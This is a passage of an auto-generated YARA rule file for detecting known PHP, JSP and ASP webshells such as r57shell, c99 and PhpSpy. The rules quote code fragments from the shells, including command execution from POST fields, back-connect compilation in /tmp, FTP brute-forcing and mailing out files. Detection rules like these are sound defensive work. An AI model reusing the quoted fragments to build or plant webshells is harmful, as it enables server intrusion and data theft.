      $s4 = "if (!empty($_POST['alias'])){ foreach ($aliases as $alias_name=>$alias_cmd) { if ($_POST['alias'] == $alias_name){$_POST['cmd']=" ascii
      $s5 = "if ($_POST['cmd']==\"db_query\")" fullword ascii
      $s6 = " if(!$file=@fopen($_POST['e_name'],\"r\")) { echo re($_POST['e_name']); $_POST['cmd']=\"\"; }" fullword ascii
      $s7 = "if (!empty($_POST['alias'])){ foreach ($aliases as $alias_name=>$alias_cmd) { if ($_POST['alias'] == $alias_name){$_POST['cmd']=" ascii
      $s8 = "echo((!empty($id))?(ws(3).$id.\"<br>\"):(ws(3).\"user=\".@get_current_user().\" uid=\".@getmyuid().\" gid=\".@getmygid().\"<br>" ascii
      $s9 = "$bsd2 = ex('sysctl -n kern.osrelease');" fullword ascii
      $s10 = "if(isset($_POST['nf1']) && !empty($_POST['new_name'])) { $nfn = $_POST['new_name']; }" fullword ascii
      $s11 = "echo ws(3).@get_current_user().\"<br>\";" fullword ascii
      $s12 = "  if(!isset($_POST['test4_port'])||empty($_POST['test4_port'])) { $_POST['test4_port'] = \"1433\"; }" fullword ascii
      $s13 = "$bsd1 = ex('sysctl -n kern.ostype');" fullword ascii
      $s14 = "  if(!isset($_POST['test3_port'])||empty($_POST['test3_port'])) { $_POST['test3_port'] = \"3306\"; }" fullword ascii
      $s15 = "<font face=Webdings size=6><b>!</b></font><b>'.ws(2).'r57shell '.$version.'</b>" fullword ascii
      $s16 = "     $sql = \"LOAD DATA INFILE \\\"\".$_POST['test3_file'].\"\\\" INTO TABLE temp_r57_table;\";" fullword ascii
      $s17 = "     $sql = \"SELECT * FROM temp_r57_table;\";" fullword ascii
      $s18 = "      else { echo ce($_POST['mk_name']); $_POST['cmd']=\"\"; }" fullword ascii
      $s19 = "       if(file_exists($_POST['mk_name']) || !$file=@fopen($_POST['mk_name'],\"w\")) { echo ce($_POST['mk_name']); $_POST['cmd']=" ascii
      $s20 = "  if(@is_file($_POST['file']))" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _r57shell127_r57shell_r57_Mohajer22_r57_125 {
   meta:
      description = "webshell - from files r57shell127.php, r57shell.php, r57_Mohajer22.php, r57.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e88efb3e4c358ce3ad25f7eca3d437cb8c27572772f29e42604c856df864a860"
      hash2 = "05f30186c9edbbf906f8971df2470fa1411f8c029ec7109f20f16ed197191644"
      hash3 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
      hash4 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
   strings:
      $s1 = "  if(!@ftp_login($connection,$_POST['ftp_login'],$_POST['ftp_password'])) { fe($language,1); }" fullword ascii
      $s2 = "if(isset($_POST['cmd']) && !empty($_POST['cmd']) && $_POST['cmd']==\"download_file\" && !empty($_POST['d_name']))" fullword ascii
      $s3 = "echo '</table>'.$table_up3.\"</div></div><div align=center id='n'><font face=Verdana size=-2><b>o---[ r57shell - http-shell by R" ascii
      $s4 = "@print \"<img src=\\\"http://127.0.0.1/r57shell/version.php?img=1&version=\".$current_version.\"\\\" border=0 height=0 width=0>" ascii
      $s5 = "$text['eng'] = array('Connect to ftp server failed','Login to ftp server failed','Can\\'t change dir on ftp server');" fullword ascii
      $s6 = " if(!$connection) { fe($language,0); $_POST['cmd'] = \"\"; }" fullword ascii
      $s7 = "if(isset($_POST['cmd']) && !empty($_POST['cmd']) && $_POST['cmd']==\"mail_file\" && !empty($_POST['loc_file']))" fullword ascii
      $s8 = "if(isset($_POST['cmd']) && !empty($_POST['cmd']) && $_POST['cmd']==\"mail\")" fullword ascii
      $s9 = " else if(!$users=get_users()) { echo \"<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><fo" ascii
      $s10 = " if(!$file=@fopen($_POST['loc_file'],\"r\")) { echo re($_POST['loc_file']); $_POST['cmd']=\"\"; }" fullword ascii
      $s11 = " header(\"Content-type: image/gif\");" fullword ascii
      $s12 = "  if(!$file=@fopen($_POST['d_name'],\"r\")) { echo re($_POST['d_name']); $_POST['cmd']=\"\"; }" fullword ascii
      $s13 = ".getElementById(\\''.$id.'\\').style.display = \\'block\\'; document.cookie=\\''.$id.'=1;\\';\" title=\"'.$lang[$language.'_text" ascii
      $s14 = " return '&nbsp<img src='.$_SERVER['PHP_SELF'].'?img=1 onClick=\"document.getElementById(\\''.$id.'\\').style.display = \\'none" ascii
      $s15 = "if($unix) { echo ws(2).$lb.\" <a href=\".$_SERVER['PHP_SELF'].\"?users title=\\\"\".$lang[$language.'_text95'].\"\\\"><b>users</" ascii
      $s16 = "if($unix) { echo ws(2).$lb.\" <a href=\".$_SERVER['PHP_SELF'].\"?users title=\\\"\".$lang[$language.'_text95'].\"\\\"><b>users</" ascii
      $s17 = " echo base64_decode($images[$_GET['img']]);" fullword ascii
      $s18 = "cument.cookie=\\''.$id.'=0;\\';\" title=\"'.$lang[$language.'_text109'].'\"><img src='.$_SERVER['PHP_SELF'].'?img=2 onClick=\"do" ascii
      $s19 = " $res = mail($_POST['to'],$_POST['subj'],$_POST['text'],\"From: \".$POST['from'].\"\\r\\n\");" fullword ascii
      $s20 = "    if(empty($_POST['subj'])) { $_POST['subj'] = 'file from r57shell'; }" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _angel_2008_spy_2011_2013_2009mssql_126 {
   meta:
      description = "webshell - from files angel.php, 2008.php, spy.php, 2011.php, 2013.php, 2009mssql.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "61f8635790fa5873c4fbcf873e9e8ff18ce3ed0a5a68f464401118adac3f969a"
      hash2 = "5c00d5b172f123e7eb9c0735b60fbaf48b22eec4c7560d9586d891d85e0b3db5"
      hash3 = "e1c70ddcfbc56c7dff46ea03ed53aab3f022e53a6f8e98f12d8b8557cc6bfb4d"
      hash4 = "8fcb2efc5be0f0ac3aa7ac7c40a16418f193daad04920977c415917617f9b936"
      hash5 = "106c686e2688535d2ff747203fdec675096fc9287655f833485520ae5e8365bb"
      hash6 = "77b769be4387a43095812683ce1759814aba6e12792a26e1cf0bb8b4156cd80d"
   strings:
      $s1 = "$res = execute('gcc -o /tmp/angel_bc /tmp/angel_bc.c');" fullword ascii
      $s2 = "$path = execute(\"which $pr\");" fullword ascii
      $s3 = "$dbs[] = '-- Select a database --';" fullword ascii
      $s4 = "p(' | Current Table: <a href=\"javascript:settable(\\''.$tablename.'\\');\">'.$tablename.'</a> [ <a href=\"javascript:settable(" ascii
      $s5 = "makeinput(array('name'=>'dbhost','size'=>20,'value'=>$dbhost));" fullword ascii
      $s6 = "p('DBHost:');" fullword ascii
      $s7 = "$table_rows = $table_rows + $table['Rows'];" fullword ascii
      $s8 = "$data_size = $data_size + $table['Data_length'];" fullword ascii
      $s9 = "@unlink('/tmp/angel_bc.c');" fullword ascii
      $s10 = "cf('/tmp/angel_bc',$back_connect);" fullword ascii
      $s11 = "p('<p><table width=\"200\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tr><td colspan=\"2\">Run SQL query/queries on datab" ascii
      $s12 = "p('Your Port:');" fullword ascii
      $s13 = "m('Backup failed');" fullword ascii
      $s14 = "makeinput(array('name'=>'dbpass','size'=>15,'value'=>$dbpass));" fullword ascii
      $s15 = "makeinput(array('name'=>'dbuser','size'=>15,'value'=>$dbuser));" fullword ascii
      $s16 = "p('DBUser:');" fullword ascii
      $s17 = "p('DBPass:');" fullword ascii
      $s18 = "if ($tablename && !$sql_query) {" fullword ascii
      $s19 = "foreach ($tabledb as $key => $table) {" fullword ascii
      $s20 = "cf('/tmp/angel_bc.c',$back_connect_c);" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _404_in_data02_Jsp_warn_leo_jfolder01_JFolder_shell1_webshell_nc_jsp_400_suiyue_127 {
   meta:
      description = "webshell - from files 404.jsp, in.jsp, data02.jsp, Jsp.jsp, warn.jsp, leo.jsp, jfolder01.jsp, JFolder.jsp, shell1.jsp, webshell-nc.jsp, jsp.jsp, 400.jsp, suiyue.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "2b9e91c45df8a47f2467687ea4991bf472a4de5a9cc385607fe93b7d65a190b0"
      hash2 = "4a2e30384b406fcae72571881aef4f7b78a9f7a918d583683f0c1f05e745400a"
      hash3 = "4b4fe0aa707377467c8902275cc8b0bca9a1bb82c2ee143f2a66740c6ee7b1a9"
      hash4 = "3e4413d2aa81b756f09f9eb472e742c7d2062f39e27a8d29a25a80ebab09b64a"
      hash5 = "4c392fe2056ff0333b35b75033c79c593135b7f14f70f77a5bb9bc842f24c95e"
      hash6 = "956fd75fa839357ecf2a661d7d2e569b93f2ee1b384db1f31dbd9d8a6c4848fe"
      hash7 = "74a40d1f616e3843e5b5c6e4c26b6d1afe387ae4cf7e9778f476ed483587a09a"
      hash8 = "c953f215c5b45546fb790990e62d2c2c92fcc44c12e4bf7d49582f4621c6505c"
      hash9 = "d7a86a83544229f9cd45878e70294537382cd2b99c58443a1aa8582be0ad6a62"
      hash10 = "23c6ec0fa69a46fadc013bb6a8aadbd5fe98e1146eb9da448dc03ece5fc564a0"
      hash11 = "d68309110a26e6a2e68243f5c741ec48f31ead236fa726d0fee1fa656e3bdff8"
      hash12 = "7f9280722b4cace28d9abad207c037e723a4e81264de262ab4f537037c10f733"
      hash13 = "d0b0f9eace0b5f380e3349de69be4580c579c21f3ba6d25d21dc16627e0f18e4"
   strings:
      $s1 = "aobject.style.backgroundColor=document.getElementById(\"tabcontentcontainer\").style.backgroundColor=themecolor" fullword ascii
      $s2 = "<form name=\"cmd\" action=\"\" method=\"post\">" fullword ascii
      $s3 = "String strCmd = request.getParameter(\"cmd\");" fullword ascii
      $s4 = "function doForm(action,path,file,cmd,tab,content)" fullword ascii
      $s5 = "document.getElementById(previoustab).style.display=\"none\"" fullword ascii
      $s6 = "var elstyle=window.getComputedStyle(el, \"\")" fullword ascii
      $s7 = "else if (window.getComputedStyle){" fullword ascii
      $s8 = "document.getElementById(cid).style.display=\"block\"" fullword ascii
      $s9 = "window.addEventListener(\"load\", do_onload, false)" fullword ascii
      $s10 = "String strFile = request.getParameter(\"file\");" fullword ascii
      $s11 = "return elstyle.getPropertyValue(csspropertyNS)" fullword ascii
      $s12 = "else if (document.getElementById)" fullword ascii
      $s13 = "if (document.getElementById){" fullword ascii
      $s14 = "<DIV id=\"tabcontentcontainer\">" fullword ascii
      $s15 = "var tabobj=document.getElementById(\"tablist\")" fullword ascii
      $s16 = "function expandcontent(cid, aobject){" fullword ascii
      $s17 = "expandcontent(initialtab[1], tabobjlinks[initialtab[0]-1])" fullword ascii
      $s18 = "<!--Top Menu Started-->" fullword ascii
      $s19 = "var themecolor=aobject.getAttribute(\"theme\")? aobject.getAttribute(\"theme\") : initTabpostcolor" fullword ascii
      $s20 = "<form name=\"frmCqq\" method=\"post\" action=\"\">" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x3c0a ) and filesize < 100KB and ( 8 of them )
      ) or ( all of them )
}

rule _2009lite_2009mssql_128 {
   meta:
      description = "webshell - from files 2009lite.php, 2009mssql.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "61956e7a2fe44293ceaedc2e56ac52eee13064cd328fab1c5b314e5dc56012a6"
      hash2 = "77b769be4387a43095812683ce1759814aba6e12792a26e1cf0bb8b4156cd80d"
   strings:
      $s1 = "<td><span style=\"float:right;\"><a href=\"http://www.4ngel.net\" target=\"_blank\"><?php echo str_replace('.','','P.h.p.S.p.y')" ascii
      $s2 = "Copyright (C) 2004-2009 <a href=\"http://www.4ngel.net\" target=\"_blank\">Security Angel Team [S4T]</a> All Rights Reserved." fullword ascii
      $s3 = "r: 2009 Build 20081222</a></span><?php echo $_SERVER['HTTP_HOST'];?> (<?php echo gethostbyname($_SERVER['SERVER_NAME']);?>)</td>" ascii
      $s4 = "if ($_COOKIE['loginpass'] != $admin['pass']) {" fullword ascii
      $s5 = "scookie('loginpass', md5($password));" fullword ascii
      $s6 = "if ($admin['pass'] == md5($password)) {" fullword ascii
      $s7 = "p('<td nowrap><a href=\"javascript:dofile(\\'deldir\\',\\''.$dirdb['server_link'].'\\',\\'Are you sure will delete <'.$dirdb['fi" ascii
      $s8 = "'].'>? \\\\n\\\\nIf non-empty directory, will be delete all the files.\\')\">Del</a> | <a href=\"javascript:rename(\\''.$dirdb['" ascii
      $s9 = "p('<td nowrap><a href=\"javascript:dofile(\\'deldir\\',\\''.$dirdb['server_link'].'\\',\\'Are you sure will delete <'.$dirdb['fi" ascii
      $s10 = "$ext = getextension($file);" fullword ascii
      $s11 = "function getextension($filename) {" fullword ascii
      $s12 = "if ($obj && is_object($obj) && is_array($obj->Drives)) {" fullword ascii
      $s13 = "m('Deleted file have finished,choose '.count($dl).' success '.$succ.' fail '.$fail);" fullword ascii
      $s14 = "if ($_SERVER[\"DOCUMENT_ROOT\"]) {" fullword ascii
      $s15 = "p('<form action=\"'.$self.'\" method=\"POST\" enctype=\"multipart/form-data\"><div style=\"float:right;\"><input class=\"input\"" ascii
      $s16 = "'keybcs2'," fullword ascii
      $s17 = "$dir = $_SERVER[\"DOCUMENT_ROOT\"];" fullword ascii
      $s18 = "'binary'," fullword ascii
      $s19 = "'eucjpms'," fullword ascii
      $s20 = "'geostd8'," fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _4_0_2013110125027897__2014_4_0__1___2012____1__129 {
   meta:
      description = "webshell - from files 4.0.asp, 2013110125027897.asp, _2014.asp, 4.0 (1).asp, _2012.asp, .asp,  (1).asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "291f142cf50354c5f224c02823c6f752fe9b73ea120829c357cda51719efbf80"
      hash2 = "aa77ff5d79dbbe7fb143ff3609814d84d72d4d057188954bfdf72f282733b5b8"
      hash3 = "dbe7c6efd138b10ccbec38547eea33e8fefd21f9210378107c268d02f844ef5e"
      hash4 = "bd4aea1c2f8cbf4910acc7ae124482299e64b6fed9bf41bbc8e7e7441b195528"
      hash5 = "608a7c994916084ff0f91b3dbe31a52763eab03ee2dd35dbc14592cc7bf7a096"
      hash6 = "61cd9e83ae25b8cee03369fe32a4a82ad54829e9d89b8db5267fb1d87d209da6"
      hash7 = "c4f1ef150f666537d2a6f97f432419c38c63fc3818b1b97ee5dca3ff804e2ff8"
   strings:
      $s1 = ": </td><td width='10%'><input name='path' type='text' value='C:\\Documents and Settings\\All Users\\Application Data\\\\Symantec" ascii
      $s2 = ": </td><td width='10%'><input name='path' type='text' value='C:\\Documents and Settings\\All Users\\Application Data\\\\Symantec" ascii
      $s3 = "Path=Session(\"FolderPath\")&\"\\shell.asp\":Txt=strBAD" fullword ascii
      $s4 = "</td><td bgcolor='#FFFFFF'> </td><td bgcolor='#FFFFFF'>\"&Request.ServerVariables(\"NUMBER_OF_PROCESSORS\")&\"</td></tr><tr alig" ascii
      $s5 = "</td><td bgcolor='#FFFFFF'> </td><td bgcolor='#FFFFFF'>\"&Request.ServerVariables(\"NUMBER_OF_PROCESSORS\")&\"</td></tr><tr alig" ascii
      $s6 = "j \"<Form action='\"&URL&\"?Action2=Post' method='post' name='EditForm'><input name='Action' value='EditFile' Type='hidden'><inp" ascii
      $s7 = "ywhere\\Citempl.cif' size='80'></td><td><input type='submit' value=' " fullword ascii
      $s8 = "j \"<script>ShowFolder(\"\"\"&Session(\"FolderPath\")&\"\"\")</script><center>" fullword ascii
      $s9 = "j \"<script>ShowFolder(\"\"\"&RePath(ofolder.parentfolder)&\"\"\")</script>\"" fullword ascii
      $s10 = ":\"&htp&\"soft/Radmin_hash.rar<br><br>\"" fullword ascii
      $s11 = "</td><td bgcolor='#FFFFFF'> </td><td bgcolor='#FFFFFF'>\"&request.serverVariables(\"SERVER_NAME\")&\"</td></tr><form method=post" ascii
      $s12 = "</div><form name='xform' method='post'><table width='80%'border='0'><tr><td width='10%'>cif" fullword ascii
      $s13 = "j \"<Form action='\"&URL&\"?Action2=Post' method='post' name='EditForm'><input name='Action' value='EditFile' Type='hidden'><inp" ascii
      $s14 = "j\"<form method=post>\"" fullword ascii
      $s15 = "j\"<input name=theUrl value='http://' size=80><input type=submit value=' " fullword ascii
      $s16 = "End If:Dim Http, theUrl, thePath, stream, fileName, overWrite" fullword ascii
      $s17 = " j = j * 16 " fullword ascii
      $s18 = "For i = 1 To number Step 2 " fullword ascii
      $s19 = "SI=\"<br><table width='80%' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'><tr><td height='20' colspan" ascii
      $s20 = "j\"<option value=''>" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x6f3c ) and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _shell_decoded_tool_aspydrv_devilzShell_130 {
   meta:
      description = "webshell - from files shell_decoded.asp, tool.asp, aspydrv.asp, devilzShell.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "d3bc4102bba36224ad94e0f8a23cc31f8a9278f5fc1797693329204ef0b15e6b"
      hash2 = "1b207bde3e188f088688cf0dce9da6108efc249969692de876f2ea174fb75549"
      hash3 = "d4e2230991106a793376037e910e657d810a4679ab08fbad3eb9b6089a6365c0"
      hash4 = "ff753fda2b86325ce018a56429a6e324eb7a05e2893eeee240b9e73708277817"
   strings:
      $s1 = "nPos = InstrB(nPosEnd, biData, CByteString(\"Content-Type:\"))" fullword ascii
      $s2 = "oUploadFile.ContentType = CWideString(MidB(biData, nPosBegin, nPosEnd-nPosBegin))" fullword ascii
      $s3 = "nPosEnd = InstrB(nPosBegin, biData, vDataBounds) - 2" fullword ascii
      $s4 = "Public Property Get FileSize()" fullword ascii
      $s5 = "Public Property Get Form(sIndex)" fullword ascii
      $s6 = "Class FileUploader" fullword ascii
      $s7 = "Set Files = Server.CreateObject(\"Scripting.Dictionary\")" fullword ascii
      $s8 = "biData = Request.BinaryRead(Request.TotalBytes)" fullword ascii
      $s9 = "Set mcolFormElem = Server.CreateObject(\"Scripting.Dictionary\")" fullword ascii
      $s10 = "Set oFS = Server.CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
      $s11 = "oUploadFile.FileData = MidB(biData, nPosBegin, nPosEnd-nPosBegin)" fullword ascii
      $s12 = "oUploadFile.FileName = Right(sFileName, Len(sFileName)-InStrRev(sFileName, \"\\\"))" fullword ascii
      $s13 = "Public Default Sub Upload()" fullword ascii
      $s14 = "nPos = InstrB(nDataBoundPos, biData, CByteString(\"Content-Disposition\"))" fullword ascii
      $s15 = "nPosBegin = nPos + 4" fullword ascii
      $s16 = "nPosBegin = nPos + 14" fullword ascii
      $s17 = "nDataBoundPos = InstrB(nDataBoundPos + LenB(vDataBounds), biData, vDataBounds)" fullword ascii
      $s18 = "nPosBegin = nPosFile + 10" fullword ascii
      $s19 = "nPosBegin = nPos + 6" fullword ascii
      $s20 = "Public FileData" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x2023 ) and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _2014_2013____1__131 {
   meta:
      description = "webshell - from files 2014.asp, 2013.asp, .asp,  (1).asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "028bc60e3c833563e1b96911bd9357d0015c765524fbbfca29afe33257dd48e7"
      hash2 = "8d7e8a0c10ac15a65f119551a616520dd7be2c35a7fdc51000c66f63abc92fee"
      hash3 = "61cd9e83ae25b8cee03369fe32a4a82ad54829e9d89b8db5267fb1d87d209da6"
      hash4 = "c4f1ef150f666537d2a6f97f432419c38c63fc3818b1b97ee5dca3ff804e2ff8"
   strings:
      $s1 = "j cdx&\"<a href='?Action=EditPower&PowerPath=\\\\.\\\"&ScriptPath&\"' target='FileFrame'>\"&cxd&\" " fullword ascii
      $s2 = "<a><a class=am href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\\"\")'>(5)" fullword ascii
      $s3 = "<a><a class=am href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\Documents\"\")'>(4)" fullword ascii
      $s4 = "<a><a class=am href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\" fullword ascii
      $s5 = "<a>&nbsp;&nbsp;&nbsp;&nbsp;<a class=am href='javascript:ShowFolder(\"\"C:\\\\Program Files\\\\RhinoSoft.com\"\")'>(3)" fullword ascii
      $s6 = "j \"<html><meta http-equiv=\"\"Content-Type\"\" content=\"\"text/html; charset=gb2312\"\"><title>\"&mNametitle&\" - \"&ServerIP&" ascii
      $s7 = "<a><a class=am href='javascript:ShowFolder(\"\"e:\\\\recycler\"\")'>(10)" fullword ascii
      $s8 = "<a><a class=am href='javascript:ShowFolder(\"\"D:\\\\recycler\"\")'>(9)" fullword ascii
      $s9 = "<a><a class=am href='javascript:ShowFolder(\"\"C:\\\\WINDOWS\\\\Temp\"\")'>&nbsp;&nbsp;(2)" fullword ascii
      $s10 = "<a><a class=am href='javascript:ShowFolder(\"\"C:\\\\recycler\"\")'>(8)" fullword ascii
      $s11 = "j cdx&\"<a href='?Action=CustomScanDriveForm' target='FileFrame'>\"&cxd&\"  <font color=red>" fullword ascii
      $s12 = "<a>   <a class=am href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\" fullword ascii
      $s13 = "j \"<form name=\"\"hideform\"\" method=\"\"post\"\" action=\"\"\"&URL&\"\"\" target=\"\"FileFrame\"\"><input type=\"\"hidden\"\"" ascii
      $s14 = "j cdx&\"<a href='?Action=delpoint' target='FileFrame'>\"&cxd&\"  <font color=red>" fullword ascii
      $s15 = "RECYCLER(e:\\)" fullword ascii
      $s16 = "RECYCLER(d:\\)" fullword ascii
      $s17 = "RECYCLER(C:\\)" fullword ascii
      $s18 = "j cdx&\"<a href='?Action=ProFile' target='FileFrame'>\"&cxd&\" " fullword ascii
      $s19 = "j \"<form name=\"\"hideform\"\" method=\"\"post\"\" action=\"\"\"&URL&\"\"\" target=\"\"FileFrame\"\"><input type=\"\"hidden\"\"" ascii
      $s20 = " type=\"\"hidden\"\" name=\"\"FName\"\"></form><table width='100%'><form name='addrform' method='post' action='\"&URL&\"' target" ascii
   condition:
      ( ( uint16(0) == 0x6f3c or uint16(0) == 0x253c ) and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _MySQL_Web_Interface_Version_0_8_v4xGus6X_132 {
   meta:
      description = "webshell - from files MySQL Web Interface Version 0.8.php, v4xGus6X.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "8548e7070db852e66fcfe2f9aca057847a4a77171a083a715d450bb4149204ef"
      hash2 = "f81558fca974375a5e6512dece2d3d3a0d854390223511c609ed61a104f9e2fa"
   strings:
      $s1 = "echo \"<option>PASSWORD\\n\";" fullword ascii
      $s2 = "$msg  = mysql_error();" fullword ascii
      $s3 = "$key .= \"&\" . $field->name . \"=\" . $data;" fullword ascii
      $s4 = "echo \"<option>USER\\n\";" fullword ascii
      $s5 = "$key .= $field->name . \"=\" . $GLOBALS[$field->name] . \" AND \";" fullword ascii
      $s6 = "if( $field->primary_key == 1 )" fullword ascii
      $s7 = "$key .= $field->name . \"='\" . $GLOBALS[$field->name] . \"' AND \";" fullword ascii
      $s8 = "echo \"<h3>Error : $msg</h3><p>\\n\";" fullword ascii
      $s9 = "echo \"<td>\".$field[\"Key\"].\"</td>\\n\";" fullword ascii
      $s10 = "for( $j = 0; $j < $col; $j++ )" fullword ascii
      $s11 = "echo \"<option>NOW\\n\";" fullword ascii
      $s12 = "if( $orderby != \"\" )" fullword ascii
      $s13 = "echo \"<option>\\n\";" fullword ascii
      $s14 = "$field = mysql_fetch_array( $pResult );" fullword ascii
      $s15 = "echo \"<option>TO_DAYS\\n\";" fullword ascii
      $s16 = "echo \"<option>RAND\\n\";" fullword ascii
      $s17 = "$queryStr .= \" ORDER BY $orderby\";" fullword ascii
      $s18 = "echo \"<td>\".$field[\"Null\"].\"</td>\\n\";" fullword ascii
      $s19 = "if( $value == $str )" fullword ascii
      $s20 = "$field = mysql_fetch_field( $pResult, $j );" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _EgY_SpIdEr_ShElL_V2_c99_PSych0_c99_locus7s_133 {
   meta:
      description = "webshell - from files EgY_SpIdEr ShElL V2.php, c99_PSych0.php, c99_locus7s.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "32fc83de0860f0f4b33976d33c9899061e7529694f25b8c7b09b2838c111adcc"
      hash2 = "39b8871928d00c7de8d950d25bff4cb19bf9bd35942f7fee6e0f397ff42fbaee"
      hash3 = "960feb502f913adff6b322bc9815543e5888bbf9058ba0eb46ceb1773ea67668"
   strings:
      $s1 = " <br>urldecode - <input type=text size=35 onFocus=\\\"this.select()\\\" onMouseover=\\\"this.select()\\\" onMouseout=\\\"this.se" ascii
      $s2 = " <br></center><b>Base64:</b><center>base64_encode - <input type=text size=35 onFocus=\\\"this.select()\\\" onMouseover=\\\"this." ascii
      $s3 = " echo \"</center><b>Url:</b><center><br>urlencode - <input type=text size=35 onFocus=\\\"this.select()\\\" onMouseover=\\\"this." ascii
      $s4 = "  echo $v.\" - <input type=text size=50 onFocus=\\\"this.select()\\\" onMouseover=\\\"this.select()\\\" onMouseout=\\\"this.sele" ascii
      $s5 = " echo \"<script>function set_encoder_input(text) {document.forms.encoder.input.value = text;}</script><center><b>Encoder:</b></c" ascii
      $s6 = " echo \"<center>base64_decode - \"; " fullword ascii
      $s7 = " if (base64_encode(base64_decode($encoder_input)) != $encoder_input) {echo \"<input type=text size=35 value=\\\"failed\\\" disab" ascii
      $s8 = "   $tmp = @ob_get_contents(); " fullword ascii
      $s9 = " echo \"</center><br><b>Base convertations</b>:<center>dec2hex - <input type=text size=35 onFocus=\\\"this.select()\\\" onMouseo" ascii
      $s10 = "  if (unlink(__FILE__)) {@ob_clean(); echo \"Thanks for using c99shell v.\".$shver.\"!\"; c99shexit(); } " fullword ascii
      $s11 = "alue=\\\"\".htmlspecialchars(urldecode($encoder_input)).\"\\\" readonly> " fullword ascii
      $s12 = "   $phpinfo = base64_encode(ob_get_contents()); " fullword ascii
      $s13 = "if ($act == \"update\") {$ret = c99sh_getupdate(!!$confirmupdate); echo \"<b>\".$ret.\"</b>\"; if (stristr($ret,\"new version\")" ascii
      $s14 = ")\\\" onMouseout=\\\"this.select()\\\" value=\\\"\".urlencode($encoder_input).\"\\\" readonly> " fullword ascii
      $s15 = "()\\\" onMouseout=\\\"this.select()\\\" value=\\\"\".base64_encode($encoder_input).\"\\\" readonly></center>\"; " fullword ascii
      $s16 = "ut=\\\"this.select()\\\" id=\\\"debase64\\\" readonly>\".$debase64.\"</textarea>\";} " fullword ascii
      $s17 = "  if ($rows == 1) {echo \"<input type=text size=35 onFocus=\\\"this.select()\\\" onMouseover=\\\"this.select()\\\" onMouseout=" ascii
      $s18 = " else {echo \"<b>File-System buffer</b><br><br>\"; $ls_arr = $arr; $disp_fullpath = TRUE; $act = \"ls\";} " fullword ascii
      $s19 = "  else {$rows++; echo \"<textarea cols=\\\"40\\\" rows=\\\"\".$rows.\"\\\" onFocus=\\\"this.select()\\\" onMouseover=\\\"this.se" ascii
      $s20 = "e=\\\"\".$v($encoder_input).\"\\\" readonly><br>\"; " fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 900KB and ( 8 of them )
      ) or ( all of them )
}

rule _r57shell127_r57shell_SnIpEr_SA_Shell_r57_Mohajer22_r57_134 {
   meta:
      description = "webshell - from files r57shell127.php, r57shell.php, SnIpEr_SA Shell.php, r57_Mohajer22.php, r57.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e88efb3e4c358ce3ad25f7eca3d437cb8c27572772f29e42604c856df864a860"
      hash2 = "05f30186c9edbbf906f8971df2470fa1411f8c029ec7109f20f16ed197191644"
      hash3 = "ef74644065925aa8d64913f5f124fe73d8d289d5f019a104bf5f56689f49ba92"
      hash4 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
      hash5 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
   strings:
      $x1 = "  else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user))) { echo \"[+] $user:\".strrev($user).\" - s" ascii
      $x2 = "  if(@ftp_login($connection,$user,$user)) { echo \"[+] $user:$user - success\\r\\n\"; $suc++; }" fullword ascii
      $s3 = "echo sr(25,\"<b>\".$lang[$language.'_text38'].$arrow.\"</b>\",in('text','ftp_password',45,(!empty($_POST['ftp_password'])?($_POS" ascii
      $s4 = "OST['ftp_server_port']):(\"127.0.0.1:21\"))).in('hidden','cmd',0,'ftp_brute').ws(4).in('submit','submit',0,$lang[$language.'_but" ascii
